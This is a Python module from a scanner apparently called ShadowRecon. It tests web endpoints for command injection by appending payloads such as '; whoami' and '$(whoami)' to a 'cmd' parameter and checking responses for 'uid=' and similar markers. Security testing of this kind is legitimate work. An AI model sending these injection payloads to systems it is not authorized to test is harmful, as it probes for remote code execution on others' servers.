"""
Command Injection Hunter for ShadowRecon v1.0
"""

from typing import List, Dict, Any
import asyncio

class CommandInjectionHunter:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.command_payloads = [
            '; whoami',
            '| whoami',
            '& whoami',
            '`whoami`',
            '$(whoami)',
            '; id',
            '| id',
            '& id'
        ]

    async def test_endpoint(self, endpoint: Dict[str, Any], session) -> List[Dict[str, Any]]:
        """Test endpoint for command injection vulnerabilities"""
        vulnerabilities = []

        if not session:
            return vulnerabilities

        url = endpoint.get('url', '')
        if not url:
            return vulnerabilities

        for payload in self.command_payloads[:3]:  # Limit for performance
            try:
                from ..utils.http_utils import HTTPUtils

                test_url = f"{url}?cmd={payload}"
                response = await HTTPUtils.safe_request(session, 'GET', test_url)

                if response and response.get('status') == 200:
                    content = response.get('content', '')
                    # Look for command execution indicators
                    if any(indicator in content.lower() for indicator in ['uid=', 'gid=', 'groups=', 'www-data', 'apache']):
                        vulnerability = {
                            'type': 'command_injection',
                            'severity': 'critical',
                            'url': test_url,
                            'payload': payload,
                            'evidence': f'Command injection successful: {content[:100]}...',
                            'method': 'GET'
                        }
                        vulnerabilities.append(vulnerability)

                        if self.verbose:
                            print(f"[!] Command injection found: {test_url}")
                        break

            except Exception as e:
                if self.verbose:
                    print(f"[!] Error testing command injection: {e}")
                continue

        return vulnerabilities
